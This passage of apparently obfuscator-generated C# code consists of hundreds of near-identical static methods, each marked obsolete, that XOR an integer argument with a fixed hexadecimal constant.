		return int_4 ^ 0x35FF6A8C;
	}

	[Obsolete("Exclude")]
	public static int smethod_5197(int int_4)
	{
		return int_4 ^ 0x1573C6F2;
	}

	[Obsolete("Exclude")]
	public static int smethod_5198(int int_4)
	{
		return int_4 ^ 0xD6DDEF;
	}

	[Obsolete("Exclude")]
	public static int smethod_5199(int int_4)
	{
		return int_4 ^ 0x1BC4C1E3;
	}

	[Obsolete("Exclude")]
	public static int smethod_5200(int int_4)
	{
		return int_4 ^ 0x3E87D46C;
	}

	[Obsolete("Exclude")]
	public static int smethod_5201(int int_4)
	{
		return int_4 ^ 0x77B03BD3;
	}

	[Obsolete("Exclude")]
	public static int smethod_5202(int int_4)
	{
		return int_4 ^ 0x28DA4824;
	}

	[Obsolete("Exclude")]
	public static int smethod_5203(int int_4)
	{
		return int_4 ^ 0x1DDF0DFE;
	}

	[Obsolete("Exclude")]
	public static int smethod_5204(int int_4)
	{
		return int_4 ^ 0x68EC9285;
	}

	[Obsolete("Exclude")]
	public static int smethod_5205(int int_4)
	{
		return int_4 ^ 0x380460BF;
	}

	[Obsolete("Exclude")]
	public static int smethod_5206(int int_4)
	{
		return int_4 ^ 0x167BAD60;
	}

	[Obsolete("Exclude")]
	public static int smethod_5207(int int_4)
	{
		return int_4 ^ 0x4EACF85A;
	}

	[Obsolete("Exclude")]
	public static int smethod_5208(int int_4)
	{
		return int_4 ^ 0x7F8D2F6C;
	}

	[Obsolete("Exclude")]
	public static int smethod_5209(int int_4)
	{
		return int_4 ^ 0x48E6998;
	}

	[Obsolete("Exclude")]
	public static int smethod_5210(int int_4)
	{
		return int_4 ^ 0x4566B338;
	}

	[Obsolete("Exclude")]
	public static int smethod_5211(int int_4)
	{
		return int_4 ^ 0x78122D26;
	}

	[Obsolete("Exclude")]
	public static int smethod_5212(int int_4)
	{
		return int_4 ^ 0x61F63E9C;
	}

	[Obsolete("Exclude")]
	public static int smethod_5213(int int_4)
	{
		return int_4 ^ 0x303C0A50;
	}

	[Obsolete("Exclude")]
	public static int smethod_5214(int int_4)
	{
		return int_4 ^ 0x15C52F5F;
	}

	[Obsolete("Exclude")]
	public static int smethod_5215(int int_4)
	{
		return int_4 ^ 0x2169C59A;
	}

	[Obsolete("Exclude")]
	public static int smethod_5216(int int_4)
	{
		return int_4 ^ 0x4005DA43;
	}

	[Obsolete("Exclude")]
	public static int smethod_5217(int int_4)
	{
		return int_4 ^ 0x11514576;
	}

	[Obsolete("Exclude")]
	public static int smethod_5218(int int_4)
	{
		return int_4 ^ 0x171503E3;
	}

	[Obsolete("Exclude")]
	public static int smethod_5219(int int_4)
	{
		return int_4 ^ 0x27B28E2B;
	}

	[Obsolete("Exclude")]
	public static int smethod_5220(int int_4)
	{
		return int_4 ^ 0x543D0DBF;
	}

	[Obsolete("Exclude")]
	public static int smethod_5221(int int_4)
	{
		return int_4 ^ 0x536875CE;
	}

	[Obsolete("Exclude")]
	public static int smethod_5222(int int_4)
	{
		return int_4 ^ 0x4184F299;
	}

	[Obsolete("Exclude")]
	public static int smethod_5223(int int_4)
	{
		return int_4 ^ 0x26C3B3C3;
	}

	[Obsolete("Exclude")]
	public static int smethod_5224(int int_4)
	{
		return int_4 ^ 0x6EC275AE;
	}

	[Obsolete("Exclude")]
	public static int smethod_5225(int int_4)
	{
		return int_4 ^ 0xCC556D7;
	}

	[Obsolete("Exclude")]
	public static int smethod_5226(int int_4)
	{
		return int_4 ^ 0x37E738E5;
	}

	[Obsolete("Exclude")]
	public static int smethod_5227(int int_4)
	{
		return int_4 ^ 0x2F21DEF1;
	}

	[Obsolete("Exclude")]
	public static int smethod_5228(int int_4)
	{
		return int_4 ^ 0x5BA43004;
	}

	[Obsolete("Exclude")]
	public static int smethod_5229(int int_4)
	{
		return int_4 ^ 0x448ED37A;
	}

	[Obsolete("Exclude")]
	public static int smethod_5230(int int_4)
	{
		return int_4 ^ 0x6198ADC8;
	}

	[Obsolete("Exclude")]
	public static int smethod_5231(int int_4)
	{
		return int_4 ^ 0x678CC01C;
	}

	[Obsolete("Exclude")]
	public static int smethod_5232(int int_4)
	{
		return int_4 ^ 0x7C939A07;
	}

	[Obsolete("Exclude")]
	public static int smethod_5233(int int_4)
	{
		return int_4 ^ 0x61B55FE4;
	}

	[Obsolete("Exclude")]
	public static int smethod_5234(int int_4)
	{
		return int_4 ^ 0x4535B707;
	}

	[Obsolete("Exclude")]
	public static int smethod_5235(int int_4)
	{
		return int_4 ^ 0x4FEDA6AE;
	}

	[Obsolete("Exclude")]
	public static int smethod_5236(int int_4)
	{
		return int_4 ^ 0x697A7744;
	}

	[Obsolete("Exclude")]
	public static int smethod_5237(int int_4)
	{
		return int_4 ^ 0xCFFE08;
	}

	[Obsolete("Exclude")]
	public static int smethod_5238(int int_4)
	{
		return int_4 ^ 0x2926E648;
	}

	[Obsolete("Exclude")]
	public static int smethod_5239(int int_4)
	{
		return int_4 ^ 0x3F4FFCDC;
	}

	[Obsolete("Exclude")]
	public static int smethod_5240(int int_4)
	{
		return int_4 ^ 0x1183659E;
	}

	[Obsolete("Exclude")]
	public static int smethod_5241(int int_4)
	{
		return int_4 ^ 0x4D85EB08;
	}

	[Obsolete("Exclude")]
	public static int smethod_5242(int int_4)
	{
		return int_4 ^ 0x54AA0681;
	}

	[Obsolete("Exclude")]
	public static int smethod_5243(int int_4)
	{
		return int_4 ^ 0x4EA282D9;
	}

	[Obsolete("Exclude")]
	public static int smethod_5244(int int_4)
	{
		return int_4 ^ 0x6AA92A04;
	}

	[Obsolete("Exclude")]
	public static int smethod_5245(int int_4)
	{
		return int_4 ^ 0x1064AEC0;
	}

	[Obsolete("Exclude")]
	public static int smethod_5246(int int_4)
	{
		return int_4 ^ 0x5EC440D4;
	}

	[Obsolete("Exclude")]
	public static int smethod_5247(int int_4)
	{
		return int_4 ^ 0x580A6B5F;
	}

	[Obsolete("Exclude")]
	public static int smethod_5248(int int_4)
	{
		return int_4 ^ 0x37EFD83D;
	}

	[Obsolete("Exclude")]
	public static int smethod_5249(int int_4)
	{
		return int_4 ^ 0x7BA8BA58;
	}

	[Obsolete("Exclude")]
	public static int smethod_5250(int int_4)
	{
		return int_4 ^ 0x4F00C2AD;
	}

	[Obsolete("Exclude")]
	public static int smethod_5251(int int_4)
	{
		return int_4 ^ 0x3654AC44;
	}

	[Obsolete("Exclude")]
	public static int smethod_5252(int int_4)
	{
		return int_4 ^ 0x7A94F5B1;
	}

	[Obsolete("Exclude")]
	public static int smethod_5253(int int_4)
	{
		return int_4 ^ 0x3D63969F;
	}

	[Obsolete("Exclude")]
	public static int smethod_5254(int int_4)
	{
		return int_4 ^ 0x38AEBD9A;
	}

	[Obsolete("Exclude")]
	public static int smethod_5255(int int_4)
	{
		return int_4 ^ 0x47D1D71E;
	}

	[Obsolete("Exclude")]
	public static int smethod_5256(int int_4)
	{
		return int_4 ^ 0x1CB0B022;
	}

	[Obsolete("Exclude")]
	public static int smethod_5257(int int_4)
	{
		return int_4 ^ 0x3F9D441A;
	}

	[Obsolete("Exclude")]
	public static int smethod_5258(int int_4)
	{
		return int_4 ^ 0x58FF2AF5;
	}

	[Obsolete("Exclude")]
	public static int smethod_5259(int int_4)
	{
		return int_4 ^ 0x3406D02A;
	}

	[Obsolete("Exclude")]
	public static int smethod_5260(int int_4)
	{
		return int_4 ^ 0x77F78434;
	}

	[Obsolete("Exclude")]
	public static int smethod_5261(int int_4)
	{
		return int_4 ^ 0x74FBF65C;
	}

	[Obsolete("Exclude")]
	public static int smethod_5262(int int_4)
	{
		return int_4 ^ 0x3D285BC7;
	}

	[Obsolete("Exclude")]
	public static int smethod_5263(int int_4)
	{
		return int_4 ^ 0x6C2EFEA4;
	}

	[Obsolete("Exclude")]
	public static int smethod_5264(int int_4)
	{
		return int_4 ^ 0x7EFD5673;
	}

	[Obsolete("Exclude")]
	public static int smethod_5265(int int_4)
	{
		return int_4 ^ 0x48E46426;
	}

	[Obsolete("Exclude")]
	public static int smethod_5266(int int_4)
	{
		return int_4 ^ 0x6803FB41;
	}

	[Obsolete("Exclude")]
	public static int smethod_5267(int int_4)
	{
		return int_4 ^ 0x6C283D92;
	}

	[Obsolete("Exclude")]
	public static int smethod_5268(int int_4)
	{
		return int_4 ^ 0x12F1FCF8;
	}

	[Obsolete("Exclude")]
	public static int smethod_5269(int int_4)
	{
		return int_4 ^ 0x272EF1F4;
	}

	[Obsolete("Exclude")]
	public static int smethod_5270(int int_4)
	{
		return int_4 ^ 0x18C3497D;
	}

	[Obsolete("Exclude")]
	public static int smethod_5271(int int_4)
	{
		return int_4 ^ 0xD8CD2CE;
	}

	[Obsolete("Exclude")]
	public static int smethod_5272(int int_4)
	{
		return int_4 ^ 0x18E14022;
	}

	[Obsolete("Exclude")]
	public static int smethod_5273(int int_4)
	{
		return int_4 ^ 0xE070382;
	}

	[Obsolete("Exclude")]
	public static int smethod_5274(int int_4)
	{
		return int_4 ^ 0x3EEBDBF1;
	}

	[Obsolete("Exclude")]
	public static int smethod_5275(int int_4)
	{
		return int_4 ^ 0x412D1A87;
	}

	[Obsolete("Exclude")]
	public static int smethod_5276(int int_4)
	{
		return int_4 ^ 0x495417D8;
	}

	[Obsolete("Exclude")]
	public static int smethod_5277(int int_4)
	{
		return int_4 ^ 0x2C65DACF;
	}

	[Obsolete("Exclude")]
	public static int smethod_5278(int int_4)
	{
		return int_4 ^ 0x672C9C74;
	}

	[Obsolete("Exclude")]
	public static int smethod_5279(int int_4)
	{
		return int_4 ^ 0x4435AC26;
	}

	[Obsolete("Exclude")]
	public static int smethod_5280(int int_4)
	{
		return int_4 ^ 0x29ECAC6A;
	}

	[Obsolete("Exclude")]
	public static int smethod_5281(int int_4)
	{
		return int_4 ^ 0x6354E0A9;
	}

	[Obsolete("Exclude")]
	public static int smethod_5282(int int_4)
	{
		return int_4 ^ 0x4AB80061;
	}

	[Obsolete("Exclude")]
	public static int smethod_5283(int int_4)
	{
		return int_4 ^ 0xDDE8C9;
	}

	[Obsolete("Exclude")]
	public static int smethod_5284(int int_4)
	{
		return int_4 ^ 0x65990BB9;
	}

	[Obsolete("Exclude")]
	public static int smethod_5285(int int_4)
	{
		return int_4 ^ 0x4DA0DB38;
	}

	[Obsolete("Exclude")]
	public static int smethod_5286(int int_4)
	{
		return int_4 ^ 0x722DE513;
	}

	[Obsolete("Exclude")]
	public static int smethod_5287(int int_4)
	{
		return int_4 ^ 0x13B049ED;
	}

	[Obsolete("Exclude")]
	public static int smethod_5288(int int_4)
	{
		return int_4 ^ 0x68A4ED5F;
	}

	[Obsolete("Exclude")]
	public static int smethod_5289(int int_4)
	{
		return int_4 ^ 0x4C95C4BD;
	}

	[Obsolete("Exclude")]
	public static int smethod_5290(int int_4)
	{
		return int_4 ^ 0x2172D4F7;
	}

	[Obsolete("Exclude")]
	public static int smethod_5291(int int_4)
	{
		return int_4 ^ 0x60850469;
	}

	[Obsolete("Exclude")]
	public static int smethod_5292(int int_4)
	{
		return int_4 ^ 0x14C8E3C;
	}

	[Obsolete("Exclude")]
	public static int smethod_5293(int int_4)
	{
		return int_4 ^ 0xB858FCF;
	}

	[Obsolete("Exclude")]
	public static int smethod_5294(int int_4)
	{
		return int_4 ^ 0xBA52A01;
	}

	[Obsolete("Exclude")]
	public static int smethod_5295(int int_4)
	{
		return int_4 ^ 0x28FEFC39;
	}

	[Obsolete("Exclude")]
	public static int smethod_5296(int int_4)
	{
		return int_4 ^ 0x5DEE44E0;
	}

	[Obsolete("Exclude")]
	public static int smethod_5297(int int_4)
	{
		return int_4 ^ 0x412919C5;
	}

	[Obsolete("Exclude")]
	public static int smethod_5299(int int_4)
	{
		return int_4 ^ 0x7AFBD8E0;
	}

	[Obsolete("Exclude")]
	public static int smethod_5300(int int_4)
	{
		return int_4 ^ 0x33C4A5DA;
	}

	[Obsolete("Exclude")]
	public static int smethod_5301(int int_4)
	{
		return int_4 ^ 0x1F68C0D4;
	}

	[Obsolete("Exclude")]
	public static int smethod_5302(int int_4)
	{
		return int_4 ^ 0x542C5CA9;
	}

	[Obsolete("Exclude")]
	public static int smethod_5303(int int_4)
	{
		return int_4 ^ 0x6AF84AAA;
	}

	[Obsolete("Exclude")]
	public static int smethod_5304(int int_4)
	{
		return int_4 ^ 0x7E3F8FEF;
	}

	[Obsolete("Exclude")]
	public static int smethod_5305(int int_4)
	{
		return int_4 ^ 0x6327432A;
	}

	[Obsolete("Exclude")]
	public static int smethod_5306(int int_4)
	{
		return int_4 ^ 0x3E968BBB;
	}

	[Obsolete("Exclude")]
	public static int smethod_5307(int int_4)
	{
		return int_4 ^ 0x59E25998;
	}

	[Obsolete("Exclude")]
	public static int smethod_5308(int int_4)
	{
		return int_4 ^ 0x77D9C144;
	}

	[Obsolete("Exclude")]
	public static int smethod_5309(int int_4)
	{
		return int_4 ^ 0x77F42CDE;
	}

	[Obsolete("Exclude")]
	public static int smethod_5311(int int_4)
	{
		return int_4 ^ 0x44C84AC7;
	}

	[Obsolete("Exclude")]
	public static int smethod_5312(int int_4)
	{
		return int_4 ^ 0x4CB2EA30;
	}

	[Obsolete("Exclude")]
	public static int smethod_5313(int int_4)
	{
		return int_4 ^ 0x2017E9B8;
	}

	[Obsolete("Exclude")]
	public static int smethod_5314(int int_4)
	{
		return int_4 ^ 0x76410FB8;
	}

	[Obsolete("Exclude")]
	public static int smethod_5316(int int_4)
	{
		return int_4 ^ 0x58F0BB8C;
	}

	[Obsolete("Exclude")]
	public static int smethod_5317(int int_4)
	{
		return int_4 ^ 0x10617FE8;
	}

	[Obsolete("Exclude")]
	public static int smethod_5318(int int_4)
	{
		return int_4 ^ 0x17602066;
	}

	[Obsolete("Exclude")]
	public static int smethod_5319(int int_4)
	{
		return int_4 ^ 0x255249D4;
	}

	[Obsolete("Exclude")]
	public static int smethod_5320(int int_4)
	{
		return int_4 ^ 0x51C56A33;
	}

	[Obsolete("Exclude")]
	public static int smethod_5321(int int_4)
	{
		return int_4 ^ 0x6429EAA9;
	}

	[Obsolete("Exclude")]
	public static int smethod_5322(int int_4)
	{
		return int_4 ^ 0x6795170F;
	}

	[Obsolete("Exclude")]
	public static int smethod_5323(int int_4)
	{
		return int_4 ^ 0x4734E7B2;
	}

	[Obsolete("Exclude")]
	public static int smethod_5324(int int_4)
	{
		return int_4 ^ 0x5B9AAD78;
	}

	[Obsolete("Exclude")]
	public static int smethod_5325(int int_4)
	{
		return int_4 ^ 0x1DE4FA43;
	}

	[Obsolete("Exclude")]
	public static int smethod_5326(int int_4)
	{
		return int_4 ^ 0x1C857438;
	}

	[Obsolete("Exclude")]
	public static int smethod_5327(int int_4)
	{
		return int_4 ^ 0x649657CC;
	}

	[Obsolete("Exclude")]
	public static int smethod_5328(int int_4)
	{
		return int_4 ^ 0x7C166296;
	}

	[Obsolete("Exclude")]
	public static int smethod_5329(int int_4)
	{
		return int_4 ^ 0x7DAEAC86;
	}

	[Obsolete("Exclude")]
	public static int smethod_5331(int int_4)
	{
		return int_4 ^ 0x6120B8B;
	}

	[Obsolete("Exclude")]
	public static int smethod_5332(int int_4)
	{
		return int_4 ^ 0x365C03BD;
	}

	[Obsolete("Exclude")]
	public static int smethod_5333(int int_4)
	{
		return int_4 ^ 0x45E3039A;
	}

	[Obsolete("Exclude")]
	public static int smethod_5334(int int_4)
	{
		return int_4 ^ 0x10E0794F;
	}

	[Obsolete("Exclude")]
	public static int smethod_5335(int int_4)
	{
		return int_4 ^ 0x6ACB32EF;
	}

	[Obsolete("Exclude")]
	public static int smethod_5336(int int_4)
	{
		return int_4 ^ 0x16BCD901;
	}

	[Obsolete("Exclude")]
	public static int smethod_5337(int int_4)
	{
		return int_4 ^ 0x761B0297;
	}

	[Obsolete("Exclude")]
	public static int smethod_5338(int int_4)
	{
		return int_4 ^ 0x503C8E91;
	}

	[Obsolete("Exclude")]
	public static int smethod_5339(int int_4)
	{
		return int_4 ^ 0x534F1834;
	}

	[Obsolete("Exclude")]
	public static int smethod_5340(int int_4)
	{
		return int_4 ^ 0xBD1B8B3;
	}

	[Obsolete("Exclude")]
	public static int smethod_5341(int int_4)
	{
		return int_4 ^ 0x6F5B7F3B;
	}

	[Obsolete("Exclude")]
	public static int smethod_5342(int int_4)
	{
		return int_4 ^ 0x1594214A;
	}

	[Obsolete("Exclude")]
	public static int smethod_5343(int int_4)
	{
		return int_4 ^ 0x734DD38E;
	}

	[Obsolete("Exclude")]
	public static int smethod_5344(int int_4)
	{
		return int_4 ^ 0x9DC5FB2;
	}

	[Obsolete("Exclude")]
	public static int smethod_5345(int int_4)
	{
		return int_4 ^ 0x49321EDD;
	}

	[Obsolete("Exclude")]
	public static int smethod_5346(int int_4)
	{
		return int_4 ^ 0x427A17C8;
	}

	[Obsolete("Exclude")]
	public static int smethod_5347(int int_4)
	{
		return int_4 ^ 0xD8BBA67;
	}

	[Obsolete("Exclude")]
	public static int smethod_5348(int int_4)
	{
		return int_4 ^ 0x5CA37F99;
	}

	[Obsolete("Exclude")]
	public static int smethod_5349(int int_4)
	{
		return int_4 ^ 0x7DF9D393;
	}

	[Obsolete("Exclude")]
	public static int smethod_5350(int int_4)
	{
		return int_4 ^ 0x5245D846;
	}

	[Obsolete("Exclude")]
	public static int smethod_5351(int int_4)
	{
		return int_4 ^ 0x7A597F7F;
	}

	[Obsolete("Exclude")]
	public static int smethod_5352(int int_4)
	{
		return int_4 ^ 0x1AB39AF7;
	}

	[Obsolete("Exclude")]
	public static int smethod_5353(int int_4)
	{
		return int_4 ^ 0x678A397;
	}

	[Obsolete("Exclude")]
	public static int smethod_5354(int int_4)
	{
		return int_4 ^ 0x9E31371;
	}

	[Obsolete("Exclude")]
	public static int smethod_5355(int int_4)
	{
		return int_4 ^ 0x5200F233;
	}

	[Obsolete("Exclude")]
	public static int smethod_5356(int int_4)
	{
		return int_4 ^ 0x39FF76EF;
	}

	[Obsolete("Exclude")]
	public static int smethod_5357(int int_4)
	{
		return int_4 ^ 0x694CF436;
	}

	[Obsolete("Exclude")]
	public static int smethod_5358(int int_4)
	{
		return int_4 ^ 0x2A89D60D;
	}

	[Obsolete("Exclude")]
	public static int smethod_5359(int int_4)
	{
		return int_4 ^ 0x4EC93A02;
	}

	[Obsolete("Exclude")]
	public static int smethod_5360(int int_4)
	{
		return int_4 ^ 0x444412CE;
	}

	[Obsolete("Exclude")]
	public static int smethod_5361(int int_4)
	{
		return int_4 ^ 0x4FB12225;
	}

	[Obsolete("Exclude")]
	public static int smethod_5362(int int_4)
	{
		return int_4 ^ 0x7D41E91D;
	}

	[Obsolete("Exclude")]
	public static int smethod_5364(int int_4)
	{
		return int_4 ^ 0x42DB517F;
	}

	[Obsolete("Exclude")]
	public static int smethod_5365(int int_4)
	{
		return int_4 ^ 0x4C93A084;
	}

	[Obsolete("Exclude")]
	public static int smethod_5366(int int_4)
	{
		return int_4 ^ 0x672368B3;
	}

	[Obsolete("Exclude")]
	public static int smethod_5367(int int_4)
	{
		return int_4 ^ 0x11B3F848;
	}

	[Obsolete("Exclude")]
	public static int smethod_5368(int int_4)
	{
		return int_4 ^ 0x47501B39;
	}

	[Obsolete("Exclude")]
	public static int smethod_5369(int int_4)
	{
		return int_4 ^ 0x4A7184B5;
	}

	[Obsolete("Exclude")]
	public static int smethod_5370(int int_4)
	{
		return int_4 ^ 0x77FCA263;
	}

	[Obsolete("Exclude")]
	public static int smethod_5371(int int_4)
	{
		return int_4 ^ 0x69D53F8B;
	}

	[Obsolete("Exclude")]
	public static int smethod_5372(int int_4)
	{
		return int_4 ^ 0x4E0A7C90;
	}

	[Obsolete("Exclude")]
	public static int smethod_5373(int int_4)
	{
		return int_4 ^ 0x30933070;
	}

	[Obsolete("Exclude")]
	public static int smethod_5374(int int_4)
	{
		return int_4 ^ 0x5D806E1D;
	}

	[Obsolete("Exclude")]
	public static int smethod_5375(int int_4)
	{
		return int_4 ^ 0x2DF1FD85;
	}

	[Obsolete("Exclude")]
	public static int smethod_5376(int int_4)
	{
		return int_4 ^ 0x21007F6D;
	}

	[Obsolete("Exclude")]
	public static int smethod_5377(int int_4)
	{
		return int_4 ^ 0x57D1D085;
	}

	[Obsolete("Exclude")]
	public static int smethod_5378(int int_4)
	{
		return int_4 ^ 0x329423AF;
	}

	[Obsolete("Exclude")]
	public static int smethod_5379(int int_4)
	{
		return int_4 ^ 0x5727C630;
	}

	[Obsolete("Exclude")]
	public static int smethod_5380(int int_4)
	{
		return int_4 ^ 0x7FA920BA;
	}

	[Obsolete("Exclude")]
	public static int smethod_5381(int int_4)
	{
		return int_4 ^ 0x222D1044;
	}

	[Obsolete("Exclude")]
	public static int smethod_5382(int int_4)
	{
		return int_4 ^ 0x6705A7DE;
	}

	[Obsolete("Exclude")]
	public static int smethod_5383(int int_4)
	{
		return int_4 ^ 0x55CF473F;
	}

	[Obsolete("Exclude")]
	public static int smethod_5384(int int_4)
	{
		return int_4 ^ 0x57026016;
	}

	[Obsolete("Exclude")]
	public static int smethod_5385(int int_4)
	{
		return int_4 ^ 0x6E2121D3;
	}

	[Obsolete("Exclude")]
	public static int smethod_5386(int int_4)
	{
		return int_4 ^ 0x61923D62;
	}

	[Obsolete("Exclude")]
	public static int smethod_5387(int int_4)
	{
		return int_4 ^ 0x3DFFDAB9;
	}

	[Obsolete("Exclude")]
	public static int smethod_5388(int int_4)
	{
		return int_4 ^ 0x7525F1F7;
	}

	[Obsolete("Exclude")]
	public static int smethod_5389(int int_4)
	{
		return int_4 ^ 0x2A76DB98;
	}

	[Obsolete("Exclude")]
	public static int smethod_5390(int int_4)
	{
		return int_4 ^ 0x4D0B20E4;
	}

	[Obsolete("Exclude")]
	public static int smethod_5391(int int_4)
	{
		return int_4 ^ 0x258711DA;
	}

	[Obsolete("Exclude")]
	public static int smethod_5392(int int_4)
	{
		return int_4 ^ 0x1B40AF15;
	}

	[Obsolete("Exclude")]
	public static int smethod_5393(int int_4)
	{
		return int_4 ^ 0x4CE39FE9;
	}

	[Obsolete("Exclude")]
	public static int smethod_5394(int int_4)
	{
		return int_4 ^ 0x4EBD8CC8;
	}

	[Obsolete("Exclude")]
	public static int smethod_5395(int int_4)
	{
		return int_4 ^ 0x25002931;
	}

	[Obsolete("Exclude")]
	public static int smethod_5396(int int_4)
	{
		return int_4 ^ 0x25441B10;
	}

	[Obsolete("Exclude")]
	public static int smethod_5397(int int_4)
	{
		return int_4 ^ 0x4F0CF156;
	}

	[Obsolete("Exclude")]
	public static int smethod_5398(int int_4)
	{
		return int_4 ^ 0x664D512C;
	}

	[Obsolete("Exclude")]
	public static int smethod_5399(int int_4)
	{
		return int_4 ^ 0x16523834;
	}

	[Obsolete("Exclude")]
	public static int smethod_5400(int int_4)
	{
		return int_4 ^ 0x2D2BD7E5;
	}

	[Obsolete("Exclude")]
	public static int smethod_5401(int int_4)
	{
		return int_4 ^ 0x26F8A384;
	}

	[Obsolete("Exclude")]
	public static int smethod_5402(int int_4)
	{
		return int_4 ^ 0x26F166D7;
	}

	[Obsolete("Exclude")]
	public static int smethod_5403(int int_4)
	{
		return int_4 ^ 0x1AB89E83;
	}

	[Obsolete("Exclude")]
	public static int smethod_5404(int int_4)
	{
		return int_4 ^ 0x5810123B;
	}

	[Obsolete("Exclude")]
	public static int smethod_5405(int int_4)
	{
		return int_4 ^ 0x3CE291B4;
	}

	[Obsolete("Exclude")]
	public static int smethod_5406(int int_4)
	{
		return int_4 ^ 0x45E808E7;
	}

	[Obsolete("Exclude")]
	public static int smethod_5407(int int_4)
	{
		return int_4 ^ 0xC8BCFAF;
	}

	[Obsolete("Exclude")]
	public static int smethod_5408(int int_4)
	{
		return int_4 ^ 0x199D1D39;
	}

	[Obsolete("Exclude")]
	public static int smethod_5409(int int_4)
	{
		return int_4 ^ 0x25B9BA50;
	}

	[Obsolete("Exclude")]
	public static int smethod_5410(int int_4)
	{
		return int_4 ^ 0x4DF09077;
	}

	[Obsolete("Exclude")]
	public static int smethod_5411(int int_4)
	{
		return int_4 ^ 0x9706A7E;
	}

	[Obsolete("Exclude")]
	public static int smethod_5412(int int_4)
	{
		return int_4 ^ 0x2D0092C8;
	}

	[Obsolete("Exclude")]
	public static int smethod_5413(int int_4)
	{
		return int_4 ^ 0x116E799;
	}

	[Obsolete("Exclude")]
	public static int smethod_5414(int int_4)
	{
		return int_4 ^ 0x6068D978;
	}

	[Obsolete("Exclude")]
	public static int smethod_5415(int int_4)
	{
		return int_4 ^ 0x6BDEEB1;
	}

	[Obsolete("Exclude")]
	public static int smethod_5416(int int_4)
	{
		return int_4 ^ 0x2C9F46E;
	}

	[Obsolete("Exclude")]
	public static int smethod_5417(int int_4)
	{
		return int_4 ^ 0x2C13209D;
	}

	[Obsolete("Exclude")]
	public static int smethod_5418(int int_4)
	{
		return int_4 ^ 0x5076C0E5;
	}

	[Obsolete("Exclude")]
	public static int smethod_5419(int int_4)
	{
		return int_4 ^ 0x237B18F4;
	}

	[Obsolete("Exclude")]
	public static int smethod_5420(int int_4)
	{
		return int_4 ^ 0x5084E158;
	}

	[Obsolete("Exclude")]
	public static int smethod_5421(int int_4)
	{
		return int_4 ^ 0x6246842F;
	}

	[Obsolete("Exclude")]
	public static int smethod_5422(int int_4)
	{
		return int_4 ^ 0x5D327B9F;
	}

	[Obsolete("Exclude")]
	public static int smethod_5423(int int_4)
	{
		return int_4 ^ 0x6C074328;
	}

	[Obsolete("Exclude")]
	public static int smethod_5424(int int_4)
	{
		return int_4 ^ 0x6E3436E3;
	}

	[Obsolete("Exclude")]
	public static int smethod_5425(int int_4)
	{
		return int_4 ^ 0x42ECDDAA;
	}

	[Obsolete("Exclude")]
	public static int smethod_5426(int int_4)
	{
		return int_4 ^ 0x336437F8;
	}

	[Obsolete("Exclude")]
	public static int smethod_5427(int int_4)
	{
		return int_4 ^ 0x61DDCBDA;
	}

	[Obsolete("Exclude")]
	public static int smethod_5428(int int_4)
	{
		return int_4 ^ 0x7AA9D0F;
	}

	[Obsolete("Exclude")]
	public static int smethod_5429(int int_4)
	{
		return int_4 ^ 0xBED3052;
	}

	[Obsolete("Exclude")]
	public static int smethod_5430(int int_4)
	{
		return int_4 ^ 0x7AC044E7;
	}

	[Obsolete("Exclude")]
	public static int smethod_5431(int int_4)
	{
		return int_4 ^ 0x3D01E2DA;
	}

	[Obsolete("Exclude")]
	public static int smethod_5432(int int_4)
	{
		return int_4 ^ 0x69A3BAE0;
	}

	[Obsolete("Exclude")]
	public static int smethod_5433(int int_4)
	{
		return int_4 ^ 0x62896566;
	}

	[Obsolete("Exclude")]
	public static int smethod_5434(int int_4)
	{
		return int_4 ^ 0x610810A4;
	}

	[Obsolete("Exclude")]
	public static int smethod_5435(int int_4)
	{
		return int_4 ^ 0x4EA038D4;
	}

	[Obsolete("Exclude")]
	public static int smethod_5436(int int_4)
	{
		return int_4 ^ 0x322FBA54;
	}

	[Obsolete("Exclude")]
	public static int smethod_5437(int int_4)
	{
		return int_4 ^ 0x108B2D5E;
	}

	[Obsolete("Exclude")]
	public static int smethod_5438(int int_4)
	{
		return int_4 ^ 0x7A2E9CF0;
	}

	[Obsolete("Exclude")]
	public static int smethod_5439(int int_4)
	{
		return int_4 ^ 0x6D245F7B;
	}

	[Obsolete("Exclude")]
	public static int smethod_5440(int int_4)
	{
		return int_4 ^ 0x8E6521C;
	}

	[Obsolete("Exclude")]
	public static int smethod_5441(int int_4)
	{
		return int_4 ^ 0x1E7FE0EA;
	}

	[Obsolete("Exclude")]
	public static int smethod_5442(int int_4)
	{
		return int_4 ^ 0x55C1C7D;
	}

	[Obsolete("Exclude")]
	public static int smethod_5443(int int_4)
	{
		return int_4 ^ 0x2B9608F4;
	}

	[Obsolete("Exclude")]
	public static int smethod_5444(int int_4)
	{
		return int_4 ^ 0xE48851;
	}

	[Obsolete("Exclude")]
	public static int smethod_5445(int int_4)
	{
		return int_4 ^ 0x37109820;
	}

	[Obsolete("Exclude")]
	public static int smethod_5446(int int_4)
	{
		return int_4 ^ 0x6C9A0D2E;
	}

	[Obsolete("Exclude")]
	public static int smethod_5447(int int_4)
	{
		return int_4 ^ 0x505466BF;
	}

	[Obsolete("Exclude")]
	public static int smethod_5448(int int_4)
	{
		return int_4 ^ 0x18AC46A5;
	}

	[Obsolete("Exclude")]
	public static int smethod_5449(int int_4)
	{
		return int_4 ^ 0x70FAA46D;
	}

	[Obsolete("Exclude")]
	public static int smethod_5450(int int_4)
	{
		return int_4 ^ 0x3B4C6281;
	}

	[Obsolete("Exclude")]
	public static int smethod_5451(int int_4)
	{
		return int_4 ^ 0x4E104F5;
	}

	[Obsolete("Exclude")]
	public static int smethod_5452(int int_4)
	{
		return int_4 ^ 0x36590FB3;
	}

	[Obsolete("Exclude")]
	public static int smethod_5453(int int_4)
	{
		return int_4 ^ 0x48D93810;
	}

	[Obsolete("Exclude")]
	public static int smethod_5454(int int_4)
	{
		return int_4 ^ 0x4CF288F0;
	}

	[Obsolete("Exclude")]
	public static int smethod_5455(int int_4)
	{
		return int_4 ^ 0x34CA2D82;
	}

	[Obsolete("Exclude")]
	public static int smethod_5456(int int_4)
	{
		return int_4 ^ 0x2362C4F7;
	}

	[Obsolete("Exclude")]
	public static int smethod_5457(int int_4)
	{
		return int_4 ^ 0x175CD5FD;
	}

	[Obsolete("Exclude")]
	public static int smethod_5458(int int_4)
	{
		return int_4 ^ 0x3B49015C;
	}

	[Obsolete("Exclude")]
	public static int smethod_5460(int int_4)
	{
		return int_4 ^ 0x5B63FA60;
	}

	[Obsolete("Exclude")]
	public static int smethod_5461(int int_4)
	{
		return int_4 ^ 0x17D6DA6B;
	}

	[Obsolete("Exclude")]
	public static int smethod_5462(int int_4)
	{
		return int_4 ^ 0x1CE5892F;
	}

	[Obsolete("Exclude")]
